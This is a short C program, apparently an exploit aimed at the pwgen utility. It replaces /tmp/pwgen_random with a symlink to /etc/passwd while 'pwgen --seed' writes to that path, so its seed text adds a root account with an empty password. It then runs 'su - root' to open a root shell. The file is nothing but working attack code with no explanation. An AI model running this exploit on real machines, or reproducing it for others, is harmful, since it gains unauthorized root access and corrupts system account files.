#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *new_entry =
    "::1000:1000:somebody:/home:/bin/sh\n"
    "root::0:0:root:/root:/bin/bash\n";
char *password_file = "/etc/passwd";
char *temp_file = "/tmp/pwgen_random";


int main() {
    FILE *fseed = popen("pwgen --seed", "w");
    sleep(1);
    remove(temp_file);
    symlink(password_file, temp_file);
    fprintf(fseed, new_entry);
    pclose(fseed);
    system("su - root");
    return 0;
}
